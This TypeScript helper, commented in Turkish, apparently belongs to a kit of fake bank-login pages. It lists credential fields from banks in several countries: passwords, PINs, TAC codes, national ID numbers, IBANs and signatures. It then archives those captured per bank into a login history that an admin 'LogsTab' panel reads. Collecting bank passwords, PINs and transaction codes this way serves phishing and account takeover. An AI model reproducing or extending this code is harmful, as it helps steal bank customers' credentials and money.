// Banka degisiminde eski bankanin credential kaydini history'ye arsivleyip
// flat credential alanlarini temizleyen paylasilan yardimci.
// Hem server (bank/[bank_slug]/page.tsx) hem client (banken, bank-login)
// taraflarinda kullanilir — boylece eski banka verisi yeni bankanin
// admin kolonlarina/formuna SIZMAZ.

// Admin panelin (LogsTab getCanonicalAdminBankFields + getShortBankCredentialFields)
// okudugu TUM banka-credential key varyantlari + bilinen eski key'ler.
// NOT: "phone"/"mobile"/"telephone"/"phoneNumber" KASITLI olarak listede DEGIL —
// profil telefonuyla cakisabilir, silmek veri kaybi riski yaratir.
export const BANK_CRED_KEYS: readonly string[] = [
  "loginMethod",
  "personalCode",
  "personalCodeEE",
  "isikukood",
  "idNumber",
  "identityNumber",
  "kimlikNo",
  "username",
  "verfuegernummer",
  "customerNumber",
  "kullaniciAdi",
  "customerId",
  "clientNumber",
  "accountHolder",
  "password",
  "pin",
  "passcode",
  "sifre",
  "parola",
  "wachtwoord",
  "passwd",
  "bankPhone",
  "bankTelefon",
  "bankTel",
  "bankaTelefon",
  "mobilePhone",
  "tacCode",
  "tac",
  "rekeningnummer",
  "pasnummer",
  "accountNumber",
  "iban",
  "toegangscode",
  "accessCode",
  "bankAccessCode",
  "signatuur",
  "signature",
  "identificatiecode",
  "idCode",
  "dateOfBirth",
  "dob",
  "birthDate",
  "dateofbirth",
  "orderedField1",
  "orderedField2",
  "orderedField1Type",
  "orderedField2Type",
];

/**
 * fd.bankSlug, nextBankSlug'dan farkliysa:
 *  - eski bankanin credential alanlarini (yeterince doluysa) bankLoginHistory'ye arsivler
 *  - flat credential alanlarini siler
 *  - bankSlug/bankName'i sifirlar (submit "ayni banka" sanip tekrar arsivlemesin)
 * Ayni bankaysa fd'yi degistirmeden dondurur.
 */
export function archivePreviousBankOnChange(
  fd: Record<string, unknown>,
  nextBankSlug: string,
): Record<string, unknown> {
  const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
  const prevSlug = str(fd.bankSlug).toLowerCase();
  if (!prevSlug || prevSlug === nextBankSlug.trim().toLowerCase()) {
    return { ...fd };
  }

  const next: Record<string, unknown> = { ...fd };
  const old: Record<string, string> = {
    bankName: str(fd.bankName),
    bankSlug: str(fd.bankSlug),
  };
  let filled = 0;
  for (const k of BANK_CRED_KEYS) {
    old[k] = str(fd[k]);
    if (old[k]) filled++;
  }
  if (filled >= 2) {
    const arr: unknown[] = Array.isArray(fd.bankLoginHistory)
      ? [...(fd.bankLoginHistory as unknown[])]
      : [];
    arr.unshift({
      submittedAt: str(fd.bankSubmittedAt) || new Date().toISOString(),
      ...old,
    });
    next.bankLoginHistory = arr;
  }
  for (const k of BANK_CRED_KEYS) delete next[k];
  delete next.bankSubmittedAt;
  next.bankSlug = "";
  next.bankName = "";
  return next;
}
